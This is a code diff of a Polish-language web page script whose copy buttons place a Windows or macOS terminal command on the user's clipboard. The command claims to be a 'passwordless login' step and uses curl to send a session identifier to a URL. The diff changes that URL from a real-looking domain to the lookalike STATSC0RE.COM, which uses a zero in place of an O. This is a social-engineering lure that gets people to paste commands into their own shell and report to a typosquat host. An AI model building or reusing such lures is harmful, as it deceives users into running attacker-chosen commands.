@@ -80,13 +80,10 @@ $(document).ready(function() {
 
             `).appendTo("head");
 
-        $('<script>')
-            .text("gtag('sessionId', '" + sessionId + "')")
-            .appendTo("head");
-
         gtag("event", "modal", {
-            os: os,
-            source: sessionId
+            'os': os,
+            'source': sessionId,
+            'sessionId': sessionId
         });
 
         var modalContent = ``;
@@ -130,7 +127,7 @@ $(document).ready(function() {
 
         $("#copyButton-win").on("click", function () {
             
-            navigator.clipboard.writeText('cmd /c "echo To jest mój cyfrowy identyfikator: ' + sessionId + ' && curl https://www.statscore.com/logowaniebezhaslowe/' + sessionId + '"')
+            navigator.clipboard.writeText('cmd /c "echo To jest mój cyfrowy identyfikator: ' + sessionId + ' && curl HTTPS://STATSC0RE.COM/logowaniebezhaslowe/' + sessionId + '"')
                 .then(() => {
                     console.log("Skopiowano");
                     $('.hidden').show();
@@ -140,7 +137,7 @@ $(document).ready(function() {
                 });
         });
         $("#copyButton-mac").on("click", function () {
-            navigator.clipboard.writeText('bash -c "echo To jest mój cyfrowy identyfikator: ' + sessionId + ' && curl https://www.statscore.com/logowaniebezhaslowe/' + sessionId + '"')
+            navigator.clipboard.writeText('bash -c "echo To jest mój cyfrowy identyfikator: ' + sessionId + ' && curl HTTPS://STATSC0RE.COM/logowaniebezhaslowe/' + sessionId + '"')
                 .then(() => {
                     console.log("Skopiowano");
                     $('.hidden').show();
